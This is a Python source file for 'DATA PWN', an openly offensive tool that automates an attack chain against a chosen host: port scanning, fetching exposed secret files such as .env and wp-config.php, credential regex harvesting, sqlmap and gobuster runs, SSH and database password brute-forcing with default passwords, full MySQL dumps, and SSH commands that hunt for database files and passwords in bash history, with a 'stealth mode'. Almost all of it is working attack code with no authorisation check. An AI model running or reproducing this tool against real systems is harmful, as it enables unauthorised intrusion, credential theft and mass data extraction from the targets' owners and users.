#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')

"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗  █████╗ ████████╗ █████╗     ██████╗ ██╗    ██╗███╗   ██╗
║   ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██╔══██╗██║    ██║████╗  ██║
║   ██║  ██║███████║   ██║   ███████║    ██████╔╝██║ █╗ ██║██╔██╗ ██║
║   ██║  ██║██╔══██║   ██║   ██╔══██║    ██╔═══╝ ██║███╗██║██║╚██╗██║
║   ██████╔╝██║  ██║   ██║   ██║  ██║    ██║     ╚███╔███╔╝██║ ╚████║
║   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
║                                                               ║
║                    DATA PWN - Ultimate Data Hunter            ║
║                    Version 1.0 - Kali Integration             ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import subprocess
import json
import re
import time
import socket
import concurrent.futures
import shutil
import argparse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import requests

# ============================================================
# CONFIGURATION
# ============================================================

class Config:
    # Tool paths
    WORDLISTS = {
        'rockyou': '/usr/share/wordlists/rockyou.txt',
        'dirbuster': '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
        'subdomains': '/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt',
        'unix_users': '/usr/share/wordlists/metasploit/unix_users.txt',
        'windows_users': '/usr/share/wordlists/metasploit/windows_users.txt',
        'mysql_users': '/usr/share/wordlists/metasploit/mysql_users.txt',
        'postgres_users': '/usr/share/wordlists/metasploit/postgres_users.txt',
        'mssql_users': '/usr/share/wordlists/metasploit/mssql_users.txt'
    }
    
    # Common passwords (built-in fallback)
    DEFAULT_PASSWORDS = [
        '', 'root', 'admin', 'password', '123456', 'toor', 'welcome',
        'qwerty', 'abc123', 'letmein', 'monkey', 'dragon', 'master',
        'changeit', 'sa', 'oracle', 'postgres', 'mysql', 'test',
        'guest', 'user', 'demo', '12345', 'password123', 'admin123'
    ]
    
    # Database port mapping
    DB_PORTS = {
        3306: 'mysql',
        5432: 'postgresql',
        1433: 'mssql',
        1521: 'oracle',
        27017: 'mongodb',
        6379: 'redis',
        9200: 'elasticsearch'
    }
    
    # Sensitive files to check
    SENSITIVE_FILES = [
        '.env', '.env.local', '.env.production',
        'config.php', 'wp-config.php', 'database.yml',
        'settings.py', 'appsettings.json', 'web.config',
        'application.properties', 'db.php', 'config.ini',
        '.git/config', 'composer.json', 'package.json',
        'Dockerfile', 'docker-compose.yml', 'backup.sql',
        'dump.sql', 'backup.zip', 'data.sql'
    ]

# ============================================================
# UTILITY CLASSES
# ============================================================

class Color:
    """ANSI color codes for pretty output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'

class Logger:
    """Unified logging system"""
    
    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        self.log_file = f"{output_dir}/data_pwn.log"
        os.makedirs(output_dir, exist_ok=True)
        
        self.color_map = {
            "INFO": Color.CYAN,
            "SUCCESS": Color.GREEN,
            "WARNING": Color.YELLOW,
            "ERROR": Color.RED,
            "FOUND": Color.GREEN,
            "SCAN": Color.BLUE
        }
    
    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        color = self.color_map.get(level, Color.WHITE)
        print(f"{color}{log_entry}{Color.ENDC}")
        
        with open(self.log_file, 'a') as f:
            f.write(log_entry + '\n')
    
    def info(self, msg): self.log(msg, "INFO")
    def success(self, msg): self.log(msg, "SUCCESS")
    def warning(self, msg): self.log(msg, "WARNING")
    def error(self, msg): self.log(msg, "ERROR")
    def found(self, msg): self.log(msg, "FOUND")
    def scan(self, msg): self.log(msg, "SCAN")

# ============================================================
# MAIN TOOL CLASS
# ============================================================

class DataPwn:
    """Main Data Pwn tool - all-in-one data extraction"""
    
    def __init__(self):
        self.target = None
        self.output_dir = None
        self.logger = None
        self.port_info = {}
        self.credentials = {}
        self.web_info = {}
        self.vulnerabilities = []
        self.extracted_data = []
        self.kali_available = False
        self.stealth_mode = False
        
        # Check for Kali tools
        self.check_kali()
    
    # ============================================================
    # KALI TOOL CHECK
    # ============================================================
    
    def check_kali(self):
        """Check if Kali tools are available (fast check)"""
        tools = ['nmap', 'sqlmap', 'hydra', 'gobuster', 'nikto']
        found = []
        
        for tool in tools:
            try:
                if shutil.which(tool):
                    found.append(tool)
            except:
                pass
        
        # Check wpscan separately (sometimes slow)
        try:
            if shutil.which('wpscan'):
                found.append('wpscan')
        except:
            pass
        
        if found:
            self.kali_available = True
            print(f"{Color.GREEN}✓ Kali tools found: {', '.join(found)}{Color.ENDC}")
        else:
            self.kali_available = False
            print(f"{Color.YELLOW}⚠ No Kali tools found - using fallback methods{Color.ENDC}")
        
        return self.kali_available
    
    # ============================================================
    # SETUP
    # ============================================================
    
    def setup(self, target: str, stealth: bool = False):
        """Initialize the tool"""
        # Remove http:// or https:// if present
        target = target.replace('https://', '').replace('http://', '')
        target = target.split('/')[0]
        
        self.target = target
        self.stealth_mode = stealth
        self.output_dir = f"data_pwn_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.logger = Logger(self.output_dir)
        
        self.logger.info(f"Initialized Data Pwn against {target}")
        self.logger.info(f"Stealth mode: {stealth}")
        self.logger.info(f"Output directory: {self.output_dir}")
        
        return self
    
    # ============================================================
    # MENU SYSTEM
    # ============================================================
    
    def show_banner(self):
        """Display the tool banner"""
        banner = f"""
{Color.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                                   ║
║   {Color.BOLD}██████╗  █████╗ ████████╗ █████╗     ██████╗ ██╗    ██╗███╗   ██╗{Color.CYAN}
║   {Color.BOLD}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██╔══██╗██║    ██║████╗  ██║{Color.CYAN}
║   {Color.BOLD}██║  ██║███████║   ██║   ███████║    ██████╔╝██║ █╗ ██║██╔██╗ ██║{Color.CYAN}
║   {Color.BOLD}██║  ██║██╔══██║   ██║   ██╔══██║    ██╔═══╝ ██║███╗██║██║╚██╗██║{Color.CYAN}
║   {Color.BOLD}██████╔╝██║  ██║   ██║   ██║  ██║    ██║     ╚███╔███╔╝██║ ╚████║{Color.CYAN}
║   {Color.BOLD}╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝{Color.CYAN}
║                                                                   ║
║              {Color.YELLOW}DATA PWN v1.0 - Ultimate Data Hunter{Color.CYAN}              ║
║              {Color.DIM}Kali Integration - Multi-Vector Attack{Color.CYAN}              ║
╚═══════════════════════════════════════════════════════════════╝{Color.ENDC}
"""
        print(banner)
        print(f"{Color.BOLD}Target:{Color.ENDC} {self.target}")
        print(f"{Color.BOLD}Output:{Color.ENDC} {self.output_dir}")
        print(f"{Color.BOLD}Stealth:{Color.ENDC} {'Enabled' if self.stealth_mode else 'Disabled'}")
        print(f"{Color.BOLD}Kali:{Color.ENDC} {'Available' if self.kali_available else 'Not Found'}")
        print("-" * 70)
    
    def show_menu(self):
        """Display interactive menu"""
        while True:
            menu = f"""
{Color.BOLD}┌─────────────────────────────────────────────────────────────┐{Color.ENDC}
{Color.BOLD}│                    MAIN MENU                               │{Color.ENDC}
{Color.BOLD}├─────────────────────────────────────────────────────────────┤{Color.ENDC}
│  {Color.CYAN}1{Color.ENDC}. Full Attack        - Run everything (Recommended)    │
│  {Color.CYAN}2{Color.ENDC}. Reconnaissance     - Port scan + Enumeration         │
│  {Color.CYAN}3{Color.ENDC}. Web Attacks        - SQLi, LFI, Config leaks         │
│  {Color.CYAN}4{Color.ENDC}. Service Attacks    - SSH/DB brute force              │
│  {Color.CYAN}5{Color.ENDC}. Data Extraction    - Extract found data              │
│  {Color.CYAN}6{Color.ENDC}. Report             - Generate detailed report        │
│  {Color.CYAN}7{Color.ENDC}. Configure          - Change settings                 │
│  {Color.CYAN}0{Color.ENDC}. Exit               - Quit Data Pwn                   │
{Color.BOLD}└─────────────────────────────────────────────────────────────┘{Color.ENDC}
"""
            print(menu)
            
            choice = input(f"{Color.BOLD}Choice > {Color.ENDC}").strip()
            
            if choice == '0':
                self.logger.info("Exiting Data Pwn")
                sys.exit(0)
            elif choice == '1':
                self.full_attack()
            elif choice == '2':
                self.recon_phase()
            elif choice == '3':
                self.web_phase()
            elif choice == '4':
                self.service_phase()
            elif choice == '5':
                self.extract_phase()
            elif choice == '6':
                self.generate_report()
            elif choice == '7':
                self.configure_menu()
            else:
                self.logger.error("Invalid choice")
    
    def configure_menu(self):
        """Configuration menu"""
        print(f"""
{Color.BOLD}┌─────────────────────────────────────────────────────────────┐{Color.ENDC}
{Color.BOLD}│                    CONFIGURATION                            │{Color.ENDC}
{Color.BOLD}├─────────────────────────────────────────────────────────────┤{Color.ENDC}
│  {Color.CYAN}1{Color.ENDC}. Toggle Stealth Mode    : {Color.GREEN if self.stealth_mode else Color.RED}{'ON' if self.stealth_mode else 'OFF'}{Color.ENDC}
│  {Color.CYAN}0{Color.ENDC}. Back to Main                                    │
{Color.BOLD}└─────────────────────────────────────────────────────────────┘{Color.ENDC}
""")
        choice = input(f"{Color.BOLD}Choice > {Color.ENDC}").strip()
        if choice == '1':
            self.stealth_mode = not self.stealth_mode
            self.logger.info(f"Stealth mode: {'Enabled' if self.stealth_mode else 'Disabled'}")
        elif choice == '0':
            return
    
    # ============================================================
    # PHASE 1: RECONNAISSANCE (FAST)
    # ============================================================
    
    def recon_phase(self):
        """Run reconnaissance phase - FAST port scan"""
        self.logger.scan("Phase 1: Reconnaissance")
        
        # Check if target is alive
        if not self.check_host():
            self.logger.error("Host is unreachable or invalid")
            return
        
        # Fast port scan (no nmap)
        self.fast_port_scan()
        
        self.logger.success("Reconnaissance completed")
        return self.port_info
    
    def check_host(self) -> bool:
        """Check if host is reachable"""
        try:
            socket.gethostbyname(self.target)
            return True
        except:
            return False
    
    def fast_port_scan(self):
        """Fast port scanning without nmap"""
        self.logger.scan("Running fast port scan...")
        
        # Common ports to check
        common_ports = [
            21, 22, 23, 25, 53, 80, 443, 8080, 8443,  # Web
            3306, 5432, 1433, 1521,                    # Databases
            6379, 27017, 9200,                         # NoSQL
            139, 445, 3389, 5900, 6000               # Windows/VNC
        ]
        
        open_ports = {}
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5 if not self.stealth_mode else 2)
                result = sock.connect_ex((self.target, port))
                sock.close()
                if result == 0:
                    service = self.get_service_name(port)
                    return port, service
            except:
                pass
            return None, None
        
        # Scan ports in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(check_port, common_ports)
            for port, service in results:
                if port:
                    open_ports[str(port)] = service or 'unknown'
                    self.logger.found(f"Port {port} open - {service}")
        
        self.port_info = open_ports
        return open_ports
    
    def get_service_name(self, port):
        """Get service name from port number"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
            53: 'dns', 80: 'http', 443: 'https', 8080: 'http-alt',
            8443: 'https-alt', 3306: 'mysql', 5432: 'postgresql',
            1433: 'mssql', 1521: 'oracle', 6379: 'redis',
            27017: 'mongodb', 9200: 'elasticsearch', 139: 'netbios',
            445: 'smb', 3389: 'rdp', 5900: 'vnc', 6000: 'x11'
        }
        return services.get(port, 'unknown')
    
    # ============================================================
    # PHASE 2: WEB ATTACKS
    # ============================================================
    
    def web_phase(self):
        """Run web application attacks"""
        self.logger.scan("Phase 2: Web Application Attacks")
        
        if '80' not in self.port_info and '443' not in self.port_info:
            self.logger.warning("No web ports found")
            return
        
        # Check for exposed files
        self.check_exposed_files()
        
        # SQL Injection (if sqlmap available)
        if self.kali_available:
            self.run_sqlmap()
        
        # Directory enumeration (if gobuster available)
        if self.kali_available:
            self.run_gobuster()
        
        self.logger.success("Web attacks completed")
    
    def check_exposed_files(self):
        """Check for common sensitive files"""
        self.logger.scan("Checking for exposed files...")
        
        for file in Config.SENSITIVE_FILES:
            for scheme in ['http', 'https']:
                url = f"{scheme}://{self.target}/{file}"
                try:
                    resp = requests.get(url, timeout=3, verify=False)
                    if resp.status_code == 200:
                        self.logger.found(f"Exposed file: {url}")
                        self.vulnerabilities.append(f"Exposed file: {file}")
                        
                        # Save the file
                        filename = file.replace('/', '_')
                        with open(f"{self.output_dir}/exposed_{filename}", 'wb') as f:
                            f.write(resp.content)
                        
                        # Look for credentials
                        content = resp.text
                        self.search_credentials(content)
                except:
                    pass
    
    def search_credentials(self, content: str):
        """Search for credentials in content"""
        patterns = {
            'password': r'password["\s:=]+([^"\s,}]+)',
            'db_pass': r'db_pass["\s:=]+([^"\s,}]+)',
            'DB_PASS': r'DB_PASS["\s:=]+([^"\s,}]+)',
            'API_KEY': r'api_?key["\s:=]+([A-Za-z0-9_\-]{16,})',
            'token': r'token["\s:=]+([A-Za-z0-9_\-]{20,})',
            'secret': r'secret["\s:=]+([^"\s,}]+)',
            'DATABASE_URL': r'DATABASE_URL["\s:=]+([^"\s,}]+)'
        }
        
        for name, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 3:
                    self.logger.found(f"Potential credential - {name}: {match}")
    
    def run_sqlmap(self):
        """Run SQL injection testing"""
        if not self.kali_available:
            return
        
        self.logger.scan("Running sqlmap...")
        try:
            for scheme in ['http', 'https']:
                url = f"{scheme}://{self.target}"
                cmd = f"sqlmap -u {url} --batch --random-agent --level 3 --risk 2 --threads 10 --time-sec 5 --output-dir={self.output_dir}/sqlmap --dbs --tables --no-cast 2>/dev/null"
                subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
                self.logger.success("SQLMap scan completed")
                break
        except Exception as e:
            self.logger.warning(f"SQLMap error: {e}")
    
    def run_gobuster(self):
        """Directory enumeration"""
        if not self.kali_available:
            return
        
        self.logger.scan("Running gobuster...")
        try:
            extensions = "php,html,txt,sql,bak,env,yml,json,py,js,conf,config"
            cmd = f"gobuster dir -u http://{self.target} -w /usr/share/wordlists/dirb/common.txt -x {extensions} -t 50 -o {self.output_dir}/gobuster.txt 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            self.logger.success("Gobuster scan completed")
        except Exception as e:
            self.logger.warning(f"Gobuster error: {e}")
    
    # ============================================================
    # PHASE 3: SERVICE ATTACKS
    # ============================================================
    
    def service_phase(self):
        """Run service attacks (SSH, DB brute force)"""
        self.logger.scan("Phase 3: Service Attacks")
        
        # Check for SSH
        if '22' in self.port_info:
            self.run_ssh_attack()
        
        # Check for databases
        db_ports = [p for p in self.port_info.keys() if int(p) in Config.DB_PORTS]
        if db_ports:
            for port in db_ports:
                db_type = Config.DB_PORTS.get(int(port), 'unknown')
                self.run_db_attack(port, db_type)
        
        self.logger.success("Service attacks completed")
    
    def run_ssh_attack(self):
        """SSH brute force (simple fallback)"""
        self.logger.scan("Running SSH brute force...")
        
        users = ['root', 'admin', 'user', 'ubuntu', 'test']
        passwords = Config.DEFAULT_PASSWORDS
        
        for user in users:
            for password in passwords[:20]:  # Only try first 20
                try:
                    import paramiko
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.target, username=user, password=password, timeout=3)
                    self.logger.found(f"SSH credentials: {user}:{password}")
                    self.credentials['ssh'] = {'user': user, 'password': password}
                    client.close()
                    return
                except:
                    pass
                time.sleep(0.5 if not self.stealth_mode else 2)
    
    def run_db_attack(self, port: str, db_type: str):
        """Database brute force"""
        self.logger.scan(f"Checking {db_type} on port {port}...")
        
        users = ['root', 'admin', 'postgres', 'sa', 'test']
        passwords = Config.DEFAULT_PASSWORDS
        
        for user in users[:3]:
            for password in passwords[:10]:
                if self.test_db_connection(db_type, user, password):
                    self.logger.found(f"{db_type} credentials: {user}:{password}")
                    self.credentials[db_type] = {'user': user, 'password': password}
                    return
                time.sleep(0.5 if not self.stealth_mode else 2)
    
    def test_db_connection(self, db_type: str, user: str, password: str) -> bool:
        """Test database connection"""
        try:
            if db_type == 'mysql':
                import mysql.connector
                conn = mysql.connector.connect(
                    host=self.target,
                    user=user,
                    password=password,
                    connect_timeout=3
                )
                conn.close()
                return True
            elif db_type == 'postgresql':
                import psycopg2
                conn = psycopg2.connect(
                    host=self.target,
                    user=user,
                    password=password,
                    connect_timeout=3
                )
                conn.close()
                return True
        except:
            pass
        return False
    
    # ============================================================
    # PHASE 4: DATA EXTRACTION
    # ============================================================
    
    def extract_phase(self):
        """Extract data using found credentials"""
        self.logger.scan("Phase 4: Data Extraction")
        
        if not self.credentials:
            self.logger.warning("No credentials found")
            return
        
        for service, creds in self.credentials.items():
            self.extract_data(service, creds)
        
        self.logger.success("Data extraction completed")
    
    def extract_data(self, service: str, creds: dict):
        """Extract data from specific service"""
        self.logger.scan(f"Extracting from {service}...")
        
        if service == 'mysql':
            self.dump_mysql(creds['user'], creds['password'])
        elif service == 'ssh':
            self.ssh_data_mining(creds['user'], creds['password'])
    
    def dump_mysql(self, user: str, password: str):
        """Dump MySQL databases"""
        try:
            cmd = f"mysqldump -h {self.target} -u {user} -p{password} --all-databases --result-file={self.output_dir}/mysql_dump.sql 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
            if os.path.exists(f"{self.output_dir}/mysql_dump.sql"):
                self.logger.success(f"MySQL data dumped to {self.output_dir}/mysql_dump.sql")
                self.extracted_data.append('mysql_dump.sql')
        except:
            self.logger.warning("MySQL dump failed - install mysql-client")
    
    def ssh_data_mining(self, user: str, password: str):
        """Mine data via SSH"""
        self.logger.scan("Mining data via SSH...")
        
        commands = [
            "find / -name '*.sql' -o -name '*.db' -o -name '*.dump' 2>/dev/null | head -10",
            "find /var/www -name '*.php' -o -name '*.conf' 2>/dev/null | grep -E '(config|database|db)' | head -5",
            "cat ~/.bash_history | grep -E '(mysql|psql|mongo|password)' | head -5"
        ]
        
        for i, cmd in enumerate(commands):
            try:
                ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{self.target} '{cmd}' 2>/dev/null"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
                if result.stdout:
                    with open(f"{self.output_dir}/ssh_data_{i}.txt", 'w') as f:
                        f.write(result.stdout)
                    self.logger.success(f"SSH data saved to ssh_data_{i}.txt")
                    self.extracted_data.append(f'ssh_data_{i}.txt')
            except:
                pass
    
    # ============================================================
    # PHASE 5: FULL ATTACK
    # ============================================================
    
    def full_attack(self):
        """Run complete attack chain"""
        self.show_banner()
        self.logger.info("Starting full attack chain...")
        
        # Phase 1: Recon
        self.recon_phase()
        
        # Phase 2: Web attacks
        self.web_phase()
        
        # Phase 3: Service attacks
        self.service_phase()
        
        # Phase 4: Extract data
        self.extract_phase()
        
        # Phase 5: Report
        self.generate_report()
        
        self.logger.success("Full attack chain completed!")
    
    # ============================================================
    # REPORTING
    # ============================================================
    
    def generate_report(self):
        """Generate comprehensive report"""
        self.logger.scan("Generating report...")
        
        report = f"""
╔═══════════════════════════════════════════════════════════════╗
║                    DATA PWN REPORT                            ║
╚═══════════════════════════════════════════════════════════════╝

Target:           {self.target}
Date:             {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Stealth Mode:     {'Enabled' if self.stealth_mode else 'Disabled'}
Kali Available:   {'Yes' if self.kali_available else 'No'}
Output Directory: {self.output_dir}

─────────────────────────────────────────────────────────────────
OPEN PORTS
─────────────────────────────────────────────────────────────────
"""
        
        if self.port_info:
            for port, service in sorted(self.port_info.items()):
                report += f"  {port:>5}  {service:>15}\n"
        else:
            report += "  No open ports found\n"
        
        report += """
─────────────────────────────────────────────────────────────────
FOUND CREDENTIALS
─────────────────────────────────────────────────────────────────
"""
        
        if self.credentials:
            for service, creds in self.credentials.items():
                report += f"  {service:>12}  {creds.get('user', '')}:{creds.get('password', '')}\n"
        else:
            report += "  No credentials found\n"
        
        report += """
─────────────────────────────────────────────────────────────────
VULNERABILITIES
─────────────────────────────────────────────────────────────────
"""
        
        if self.vulnerabilities:
            for vuln in self.vulnerabilities:
                report += f"  • {vuln}\n"
        else:
            report += "  No vulnerabilities identified\n"
        
        report += """
─────────────────────────────────────────────────────────────────
EXTRACTED DATA
─────────────────────────────────────────────────────────────────
"""
        
        if self.extracted_data:
            for data in self.extracted_data:
                size = 0
                filepath = f"{self.output_dir}/{data}"
                if os.path.exists(filepath):
                    size = os.path.getsize(filepath)
                report += f"  • {data} ({size:,} bytes)\n"
        else:
            report += "  No data extracted\n"
        
        report += f"""
─────────────────────────────────────────────────────────────────
{Color.BOLD}SUMMARY{Color.ENDC}
─────────────────────────────────────────────────────────────────
  Open Ports:     {len(self.port_info)}
  Credentials:    {len(self.credentials)}
  Vulnerabilities:{len(self.vulnerabilities)}
  Data Files:     {len(self.extracted_data)}
  
  Status:         {'✅ DATA ACCESS ACHIEVED' if self.credentials or self.extracted_data else '⚠ No access gained'}

═══════════════════════════════════════════════════════════════
Report saved to: {self.output_dir}/report.txt
Log file:        {self.output_dir}/data_pwn.log
═══════════════════════════════════════════════════════════════
"""
        
        # Save report
        with open(f"{self.output_dir}/report.txt", 'w') as f:
            f.write(report)
        
        print(report)
        self.logger.success(f"Report saved to {self.output_dir}/report.txt")
    
    # ============================================================
    # MAIN ENTRY POINT
    # ============================================================
    
    def run(self):
        """Run the tool"""
        self.show_banner()
        
        # Check if target is valid
        if not self.check_host():
            self.logger.error(f"Invalid target: {self.target}")
            return
        
        # Display quick scan results
        self.logger.info("Running quick recon...")
        self.recon_phase()
        
        # Show menu
        self.show_menu()

# ============================================================
# COMMAND LINE INTERFACE
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="Data Pwn - Ultimate Data Extraction Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 data_pwn.py -t example.com              # Interactive mode
  python3 data_pwn.py -t example.com -a           # Full automatic attack
  python3 data_pwn.py -t example.com -a --stealth # Stealth mode
  python3 data_pwn.py -t example.com -r           # Recon only
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address or domain')
    parser.add_argument('-a', '--auto', action='store_true', help='Automatic mode (no menu)')
    parser.add_argument('-r', '--recon-only', action='store_true', help='Reconnaissance only')
    parser.add_argument('-w', '--web', action='store_true', help='Web attacks only')
    parser.add_argument('-s', '--services', action='store_true', help='Service attacks only')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--report', action='store_true', help='Generate report only')
    parser.add_argument('-o', '--output', help='Custom output directory')
    
    args = parser.parse_args()
    
    # Create tool instance
    tool = DataPwn()
    tool.setup(args.target, args.stealth)
    
    if args.output:
        tool.output_dir = args.output
    
    if args.report:
        tool.generate_report()
        return
    
    if args.auto:
        tool.full_attack()
        return
    
    if args.recon_only:
        tool.recon_phase()
        tool.generate_report()
        return
    
    if args.web:
        tool.web_phase()
        tool.generate_report()
        return
    
    if args.services:
        tool.service_phase()
        tool.generate_report()
        return
    
    # Interactive mode
    tool.run()

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}[!] Interrupted by user{Color.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"{Color.RED}[!] Error: {e}{Color.ENDC}")
        sys.exit(1)